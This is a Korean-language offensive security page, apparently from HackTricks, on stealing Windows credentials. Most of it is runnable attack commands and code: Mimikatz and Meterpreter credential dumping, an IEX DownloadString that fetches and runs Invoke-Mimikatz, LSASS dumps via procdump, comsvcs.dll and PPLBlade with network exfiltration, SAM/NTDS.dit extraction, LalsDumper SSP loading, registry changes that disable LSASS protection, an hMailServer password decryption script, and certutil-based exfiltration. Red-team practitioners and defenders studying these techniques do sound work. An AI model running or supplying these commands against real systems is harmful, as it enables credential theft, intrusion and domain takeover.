# Windows 자격 증명 탈취

{{#include ../../banners/hacktricks-training.md}}

## 자격 증명 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz가 할 수 있는 다른 작업들은** [**이 페이지**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**여기에서 가능한 일부 자격 증명 보호에 대해 알아보세요.**](credentials-protections.md) **이러한 보호는 Mimikatz가 일부 자격 증명을 추출하는 것을 방지할 수 있습니다.**

## Meterpreter를 사용한 자격 증명

**제가 만든** [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용하여 피해자 내부에서 **비밀번호 및 해시를 검색**하세요.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV 우회

### Procdump + Mimikatz

**Procdump는** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**정식 Microsoft 도구이기 때문에**, Defender에 의해 탐지되지 않습니다.\
이 도구를 사용하여 **dump the lsass process**, **download the dump**하고 dump에서 **extract**하여 **credentials locally**를 얻을 수 있습니다.

또한 [SharpDump](https://github.com/GhostPack/SharpDump)를 사용할 수도 있습니다.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**참고**: 일부 **AV**는 **procdump.exe to dump lsass.exe**의 사용을 **악성**으로 **탐지**할 수 있습니다. 이는 **"procdump.exe" and "lsass.exe"**라는 문자열을 **탐지**하기 때문입니다. 따라서 procdump에 lsass.exe의 **PID**를 **인수**로 **전달**하는 것이 **이름 lsass.exe.** **대신** 더 **은밀합니다**.

### **comsvcs.dll**로 lsass 덤프하기

`C:\Windows\System32`에 있는 **comsvcs.dll**라는 DLL은 충돌 시 **프로세스 메모리 덤프**를 담당합니다. 이 DLL에는 `MiniDumpW`라는 이름의 **function**이 포함되어 있으며, `rundll32.exe`를 사용하여 호출하도록 설계되어 있습니다.\
처음 두 인수는 중요하지 않지만, 세 번째 인수는 세 부분으로 나뉩니다. 덤프할 프로세스 ID가 첫 번째 구성요소를 이루고, 덤프 파일 위치가 두 번째를 나타내며, 세 번째 구성요소는 엄격히 **full**이라는 단어입니다. 다른 선택지는 없습니다.\
이 세 구성요소를 파싱한 후, 해당 DLL은 덤프 파일을 생성하고 지정된 프로세스의 메모리를 이 파일로 옮깁니다.\
**comsvcs.dll**의 활용은 lsass 프로세스를 덤프하는 데 사용할 수 있으므로 procdump를 업로드하고 실행할 필요를 없앱니다. 이 방법은 자세히 다음에 설명되어 있습니다: [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**이 과정을 자동화할 수 있습니다** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Task Manager로 lsass 덤프하기**

1. Task Bar에서 마우스 오른쪽 버튼을 클릭하고 Task Manager를 클릭합니다.
2. More details를 클릭합니다.
3. Processes 탭에서 "Local Security Authority Process" 프로세스를 찾습니다.
4. "Local Security Authority Process" 프로세스를 마우스 오른쪽 버튼으로 클릭하고 "Create dump file"을 클릭합니다.

### procdump로 lsass 덤프하기

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 은 Microsoft 서명된 바이너리로 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 스위트의 일부입니다.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade로 lsass 덤프하기

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 는 memory dump를 obfuscating하고 디스크에 기록하지 않고 원격 워크스테이션으로 전송하는 것을 지원하는 Protected Process Dumper Tool입니다.

**핵심 기능**:

1. PPL 보호 우회
2. memory dump files를 obfuscating하여 Defender의 signature-based detection mechanisms을 회피
3. 디스크에 기록하지 않고(RAW 및 SMB upload methods를 사용하여) memory dump를 업로드(fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP 기반 LSASS 덤프 (MiniDumpWriteDump 호출 없이)

Ink Dragon는 세 단계 덤퍼인 **LalsDumper**를 배포하며, 이 덤퍼는 `MiniDumpWriteDump`를 호출하지 않으므로 해당 API에 대한 EDR 훅이 작동하지 않습니다:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`에서 32개의 소문자 `d` 문자로 이루어진 플레이스홀더를 찾고, 이를 `rtu.txt`의 절대 경로로 덮어쓴 다음 패치된 DLL을 `nfdp.dll`로 저장하고 `AddSecurityPackageA("nfdp","fdp")`를 호출합니다. 이로써 **LSASS**가 악성 DLL을 새로운 Security Support Provider (SSP)로 로드하도록 강제합니다.
2. **Stage 2 inside LSASS** – LSASS가 `nfdp.dll`을 로드하면 DLL은 `rtu.txt`를 읽고 각 바이트를 `0x20`과 XOR한 뒤 디코딩된 블롭을 메모리에 매핑하고 실행을 전달합니다.
3. **Stage 3 dumper** – 매핑된 페이로드는 해시된 API 이름으로부터 해결된 **direct syscalls**를 사용해 MiniDump 로직을 재구현합니다 (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom`이라는 전용 export는 `%TEMP%\<pid>.ddt`를 열어 압축된 LSASS 덤프를 파일로 스트리밍한 뒤 핸들을 닫아 이후 exfiltration이 가능하도록 합니다.

운영자 노트:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, `rtu.txt`를 같은 디렉터리에 보관하세요. Stage 1이 하드코딩된 플레이스홀더를 `rtu.txt`의 절대 경로로 덮어쓰기 때문에 파일을 분리하면 체인이 끊깁니다.
* 등록은 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`에 `nfdp`를 추가하여 이뤄집니다. 해당 값을 직접 설정하면 LSASS가 부팅마다 SSP를 다시 로드하도록 할 수 있습니다.
* `%TEMP%\*.ddt` 파일은 압축된 덤프입니다. 로컬에서 압축을 풀고 Mimikatz/Volatility에 전달하여 자격 증명을 추출하세요.
* `lals.exe`를 실행하려면 `AddSecurityPackageA`가 성공하도록 admin/SeTcb 권한이 필요합니다; 호출이 반환되면 LSASS는 투명하게 악성 SSP를 로드하고 Stage 2를 실행합니다.
* 디스크에서 DLL을 삭제해도 LSASS에서 제거되지는 않습니다. 레지스트리 항목을 삭제하고 LSASS를 재시작(또는 재부팅)하거나 장기적인 persistence를 위해 그대로 둘 수 있습니다.

## CrackMapExec

### SAM 해시 덤프
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 대상 DC에서 NTDS.dit 덤프
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 대상 DC에서 NTDS.dit의 password history를 Dump
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 각 NTDS.dit 계정의 pwdLastSet 속성 표시
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

이 파일들은 **다음 경로에 있어야 합니다** _C:\windows\system32\config\SAM_ and _C:\windows\system32\config\SYSTEM._ 하지만 이들은 보호되어 있어 **일반적인 방법으로는 단순히 복사할 수 없습니다**

### 레지스트리에서

이 파일들을 steal하는 가장 쉬운 방법은 레지스트리에서 복사본을 얻는 것입니다:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
해당 파일들을 Kali 머신으로 **Download**하고 다음을 사용하여 **extract the hashes**하세요:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

이 서비스를 사용하면 보호된 파일을 복사할 수 있습니다. Administrator 권한이 필요합니다.

#### vssadmin 사용

vssadmin 바이너리는 Windows Server 버전에서만 사용할 수 있습니다.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
하지만 **Powershell**에서도 동일하게 할 수 있습니다. 다음은 **SAM file을 복사하는 방법**의 예시입니다(사용된 하드 드라이브는 "C:"이며 저장 위치는 C:\users\Public). 이 방법은 다른 보호된 파일을 복사할 때에도 사용할 수 있습니다:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

마지막으로, [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)을 사용해 SAM, SYSTEM 및 ntds.dit의 복사본을 만들 수도 있습니다.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 자격 증명 - NTDS.dit**

The **NTDS.dit** 파일은 Active Directory의 핵심으로 알려져 있으며, 사용자 객체, 그룹 및 그 멤버십에 대한 중요한 데이터를 보관합니다. 도메인 사용자의 **password hashes**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치합니다.

이 데이터베이스에는 세 가지 주요 테이블이 유지됩니다:

- **Data Table**: 이 테이블은 사용자 및 그룹과 같은 객체에 대한 세부 정보를 저장합니다.
- **Link Table**: 그룹 멤버십과 같은 관계를 추적합니다.
- **SD Table**: 각 객체에 대한 **Security descriptors**를 저장하며, 저장된 객체의 보안 및 접근 제어를 보장합니다.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows는 해당 파일과 상호작용하기 위해 _Ntdsa.dll_을 사용하며 이는 _lsass.exe_에 의해 사용됩니다. 따라서 **NTDS.dit** 파일의 일부는 **`lsass`** 메모리 내에 존재할 수 있습니다(성능 향상을 위해 **cache**를 사용하므로 최근에 접근한 데이터를 찾을 수 있습니다).

#### NTDS.dit 내부 해시 복호화

해시는 세 번 암호화되어 있습니다:

1. Password Encryption Key (**PEK**)를 **BOOTKEY**와 **RC4**로 복호화합니다.
2. **PEK**와 **RC4**를 사용해 **hash**를 복호화합니다.
3. **DES**를 사용해 **hash**를 복호화합니다.

**PEK**는 모든 도메인 컨트롤러에서 **동일한 값**을 가지지만, 각 도메인 컨트롤러의 **SYSTEM 파일의 BOOTKEY**를 사용하여 **NTDS.dit** 파일 안에서 **암호화**되어 있습니다(도메인 컨트롤러마다 다릅니다). 이 때문에 NTDS.dit 파일에서 자격 증명을 얻으려면 **NTDS.dit**와 **SYSTEM** 파일(_C:\Windows\System32\config\SYSTEM_)이 필요합니다.

### Ntdsutil를 사용한 NTDS.dit 복사

Windows Server 2008부터 사용 가능.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
또는 [**volume shadow copy**](#stealing-sam-and-system) 기법을 사용해 **ntds.dit** 파일을 복사할 수 있습니다. **SYSTEM file**의 복사본도 필요하다는 점을 기억하세요 (다시, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) 기법).

### **NTDS.dit에서 hashes 추출**

파일 **NTDS.dit** 및 **SYSTEM**을 **획득**한 후, _secretsdump.py_와 같은 도구를 사용해 **hashes를 추출**할 수 있습니다:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
유효한 domain admin user를 사용하면 **그들을 자동으로 추출할 수도 있습니다:**
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
대용량 **NTDS.dit 파일**의 경우 [gosecretsdump](https://github.com/c-sto/gosecretsdump)를 사용해 추출하는 것이 권장됩니다.

마지막으로 **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ 또는 **mimikatz** `lsadump::lsa /inject`를 사용할 수도 있습니다.

### **NTDS.dit에서 도메인 객체를 SQLite 데이터베이스로 추출하기**

NTDS 객체는 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)로 SQLite 데이터베이스에 추출할 수 있습니다. secrets뿐만 아니라 전체 객체와 그 속성까지 추출되므로, 원본 NTDS.dit 파일을 이미 확보한 경우 추가 정보 추출에 유용합니다.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive는 선택 사항이지만 secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories)을 가능하게 합니다. 기타 정보와 함께 다음 데이터가 추출됩니다: user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). 이 바이너리를 사용하여 여러 소프트웨어에서 credentials를 추출할 수 있습니다.
```
lazagne.exe all
```
## SAM과 LSASS에서 credentials를 추출하기 위한 다른 도구들

### Windows credentials Editor (WCE)

이 도구는 메모리에서 credentials를 추출하는 데 사용될 수 있습니다. 다음에서 다운로드하세요: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM 파일에서 credentials를 추출합니다.
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM 파일에서 자격 증명을 추출
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

다음에서 다운로드:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) 하고 그냥 **실행하기만 하면** 암호가 추출됩니다.

## 유휴 RDP 세션 수집 및 보안 제어 약화

Ink Dragon의 FinalDraft RAT에는 `DumpRDPHistory` tasker가 포함되어 있으며, 그 기법들은 모든 red-teamer에게 유용합니다:

### DumpRDPHistory-style telemetry collection

* **아웃바운드 RDP 대상** – 모든 사용자 하이브를 `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`에서 파싱합니다. 각 하위키는 서버 이름, `UsernameHint`, 그리고 마지막 쓰기 타임스탬프를 저장합니다. PowerShell로 FinalDraft의 로직을 재현할 수 있습니다:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **인바운드 RDP 증거** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 로그에서 이벤트 ID **21**(성공적 로그온)과 **25**(연결 끊김)를 쿼리하여 누가 해당 시스템을 관리했는지 매핑합니다:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

어떤 Domain Admin이 정기적으로 접속하는지 알게 되면, 그들의 **연결이 끊긴** 세션이 남아 있는 동안 LSASS를 덤프(LalsDumper/Mimikatz 사용)하십시오. CredSSP + NTLM fallback은 verifier와 토큰을 LSASS에 남기며, 이는 SMB/WinRM을 통해 재생되어 `NTDS.dit`을 획득하거나 도메인 컨트롤러에 persistence를 구축하는 데 사용될 수 있습니다.

### FinalDraft가 겨냥한 레지스트리 다운그레이드
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Setting `DisableRestrictedAdmin=1` forces full credential/ticket reuse during RDP, enabling pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` disables UAC token filtering so local admins get unrestricted tokens over the network.
* `DSRMAdminLogonBehavior=2` lets the DSRM administrator log on while the DC is online, giving attackers another built-in high-privilege account.
* `RunAsPPL=0` removes LSASS PPL protections, making memory access trivial for dumpers such as LalsDumper.

## hMailServer 데이터베이스 자격증명 (침해 후)

hMailServer는 DB 비밀번호를 `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`의 `[Database] Password=` 항목에 저장합니다. 값은 Blowfish로 암호화되어 있으며 정적 키 `THIS_KEY_IS_NOT_SECRET`와 4바이트 워드 엔디안 스왑을 사용합니다. INI의 헥스 문자열을 아래 Python 스니펫과 함께 사용하세요:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
평문 비밀번호를 사용해 SQL CE 데이터베이스를 파일 잠금을 피하기 위해 복사하고, 32-bit 프로바이더를 로드한 뒤 해시를 쿼리하기 전에 필요하면 업그레이드하세요:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
The `accountpassword` column uses the hMailServer hash format (hashcat mode `1421`). Cracking these values can provide reusable credentials for WinRM/SSH pivots.

## LSA 로그온 콜백 가로채기 (LsaApLogonUserEx2)

Some tooling captures **plaintext logon passwords** by intercepting the LSA logon callback `LsaApLogonUserEx2`. The idea is to hook or wrap the authentication package callback so credentials are captured **during logon** (before hashing), then written to disk or returned to the operator. This is commonly implemented as a helper that injects into or registers with LSA, and then records each successful interactive/network logon event with the username, domain and password.

운영상 주의사항:
- helper를 인증 경로에 로드하려면 로컬 admin/SYSTEM 권한이 필요합니다.
- 캡처된 자격증명은 로그온이 발생할 때만 나타납니다(후크에 따라 인터랙티브, RDP, 서비스 또는 네트워크 로그온).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) stores saved connection information in a per-user `sqlstudio.bin` file. Dedicated dumpers can parse the file and recover saved SQL credentials. In shells that only return command output, the file is often exfiltrated by encoding it as Base64 and printing it to stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
operator 측에서 파일을 다시 빌드하고 dumper를 로컬에서 실행하여 credentials를 복구하세요:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## 참고자료

- [Unit 42 – 고부가 가치 부문을 표적으로 한 수년간 탐지되지 않은 작전 조사](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: 은밀한 공격 작전의 릴레이 네트워크 및 내부 작동 방식 공개](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
